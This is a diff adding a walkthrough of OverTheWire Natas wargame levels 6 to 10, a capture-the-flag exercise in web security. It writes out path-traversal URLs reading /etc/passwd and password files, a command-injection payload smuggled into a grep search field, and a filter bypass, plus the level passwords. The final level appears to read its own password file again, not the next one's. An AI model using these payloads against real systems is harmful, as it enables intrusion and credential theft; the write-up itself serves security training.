@@ -360,3 +360,333 @@ Input secret: <input name=secret><br>
 </body>
 </html>
 ```
+
+Thus there is a `http://natas6.natas.labs.overthewire.org/includes/secret.inc` file... Try to get it with `curl`:
+
+```bash
+curl -H "Authorization: Basic bmF0YXM2OjBSb0p3SGRTS1dGVFlSNVd1aUFld2F1U3VOYUJYbmVk" http://natas6.natas.labs.overthewire.org/includes/secret.inc
+<?
+$secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+```
+
+Submit the secret in the field requiring it and get:
+
+> Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+
+## Natas 7
+
+### Credentials
+
+Username: natas7
+Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+URL: http://natas7.natas.labs.overthewire.org
+
+### Message
+
+There is a page with a **Home** and an **About** links.
+
+### Solution
+
+The Home page redirects to http://natas7.natas.labs.overthewire.org/index.php?page=home, the About page to http://natas7.natas.labs.overthewire.org/index.php?page=about.
+
+Try to get http://natas7.natas.labs.overthewire.org/index.php?page=test:
+
+> Warning: include(test): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21
+
+> Warning: include(): Failed opening 'test' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas7/index.php on line 21
+
+This error message is very useful... We can get a file from the file system, it seems.
+
+It gives us also the base directory...
+
+Try http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../etc/passwd.
+
+This works, but we are not interested in this...
+
+Try: http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../etc/natas_webpass/natas8.
+This gives us:
+
+> xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+
+## Natas 8
+
+### Credentials
+
+Username: natas8
+Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+URL: http://natas8.natas.labs.overthewire.org
+
+### Message
+
+Input secret: ...
+
+### Solution
+
+There is a View sourcecode link. The source code is this:
+
+```html
+ <html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas8", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas8</h1>
+<div id="content">
+
+<?
+
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+
+if(array_key_exists("submit", $_POST)) {
+    if(encodeSecret($_POST['secret']) == $encodedSecret) {
+    print "Access granted. The password for natas9 is <censored>";
+    } else {
+    print "Wrong secret";
+    }
+}
+?>
+
+<form method=post>
+Input secret: <input name=secret><br>
+<input type=submit name=submit>
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+We have two interesting pieces of information:
+
+```
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+```
+
+and
+
+```
+function encodeSecret($secret) {
+    return bin2hex(strrev(base64_encode($secret)));
+}
+```
+
+We shall reverse the encoding on the given encoded secret; the value thus obtained shall be passed into the form in the page.
+
+Try with the following reversing code:
+
+```php
+$encodedSecret = "3d3d516343746d4d6d6c315669563362";
+
+function decodeSecret($encodedSecret) {
+    return base64_decode(strrev(hex2bin($encodedSecret)));
+}
+
+echo decodeSecret($encodedSecret);
+```
+
+This prints:
+
+```
+oubWYf2kBq
+```
+
+This works: it returns:
+
+> Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+
+## Natas 9
+
+### Credentials
+
+Username: natas9
+Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+URL: http://natas9.natas.labs.overthewire.org
+
+### Message
+
+Find words containing: ...
+
+### Solution
+
+There is the View sourcecode link.
+
+The source code:
+
+```html
+ <html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas9", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas9</h1>
+<div id="content">
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+?>
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+The relevant PHP code:
+
+```php
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    passthru("grep -i $key dictionary.txt");
+}
+```
+
+Try http://natas9.natas.labs.overthewire.org/?needle=password. This returns:
+
+```
+password
+password's
+passwords
+```
+
+The form does exactly this: it gets a word, say `asd`, and sends it to: http://natas9.natas.labs.overthewire.org/?needle=asd&submit=Search.
+
+Find some interesting information about `passthru` here: https://www.php.net/manual/en/function.passthru.php.
+
+The function is similar to `exec`.
+
+If we input `zope dictionary.txt; cat `, we get what seems to be the content of `dictionary.txt`...
+
+Interesting. Let's try
+
+```
+zope dictionary.txt; cat /etc/natas_webpass/natas10 | tee
+```
+
+This gives us:
+
+```
+t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+```
+
+## Natas 10
+
+### Credentials
+
+Username: natas10
+Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+URL: http://natas10.natas.labs.overthewire.org
+
+### Message
+
+For security reasons, we now filter on certain characters
+
+Find words containing: ...
+
+### Solution
+
+Now `asd; cat` doesn't work anymore:
+
+> Input contains an illegal character!
+
+Neither does `&&`.
+
+The source code (obtained from the link):
+
+```html
+ <html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas10", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas10</h1>
+<div id="content">
+
+For security reasons, we now filter on certain characters<br/><br/>
+<form>
+Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
+</form>
+
+
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+</pre>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Try to exploit the behaviour of `grep`: this searches any given input file. We can provide more than one...
+
+Input: `p /etc/natas_webpass/natas10`: this corresponds to the executed command:
+
+```bash
+grep -i p /etc/natas_webpass/natas10 dictionary.txt
+```
+
+so this will search both `dictionary.txt` and `/etc/natas_webpass/natas10` for the character `p` and gives us:
+
+```
+/etc/natas_webpass/natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+...
+```
